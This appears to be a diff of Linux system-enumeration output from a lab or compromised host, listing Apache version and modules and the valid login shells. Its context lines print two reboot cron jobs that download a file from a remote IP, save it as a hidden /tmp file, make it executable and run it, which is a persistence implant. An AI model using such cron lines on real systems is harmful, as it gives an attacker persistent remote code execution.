@@ -397,3 +397,56 @@ kali     pts/2    -                15:24   18:23  56.48s  0.10s sudo su
 Cron Jobs held by all users:
 @reboot sleep 45 && wget --no-check-certificate https://192.168.19.133:8000/lin-download/eth0 -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile
 @reboot sleep 45 && wget --no-check-certificate https://192.168.19.133:8000/lin-download/eth0 -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile
+Hello
+=========== apache ===========
+Server version: Apache/2.4.54 (Debian)
+Server built:   2022-10-12T07:20:52
+=========
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+=========
+Loaded Modules:
+ core_module (static)
+ so_module (static)
+ watchdog_module (static)
+ http_module (static)
+ log_config_module (static)
+ logio_module (static)
+ version_module (static)
+ unixd_module (static)
+ access_compat_module (shared)
+ alias_module (shared)
+ auth_basic_module (shared)
+ authn_core_module (shared)
+ authn_file_module (shared)
+ authz_core_module (shared)
+ authz_host_module (shared)
+ authz_user_module (shared)
+ autoindex_module (shared)
+ deflate_module (shared)
+ dir_module (shared)
+ env_module (shared)
+ filter_module (shared)
+ mime_module (shared)
+ mpm_prefork_module (shared)
+ negotiation_module (shared)
+ php_module (shared)
+ reqtimeout_module (shared)
+ setenvif_module (shared)
+ status_module (shared)
+=========== Lists_available_shells: ===========
+# /etc/shells: valid login shells
+/bin/sh
+/bin/bash
+/usr/bin/bash
+/bin/rbash
+/usr/bin/bash
+/bin/dash
+/usr/bin/dash
+/bin/zsh
+/usr/bin/zsh
+/usr/bin/tmux
+/usr/bin/screen
+/usr/bin/pwsh
+/opt/microsoft/powershell/7/pwsh
+/usr/bin/rbash
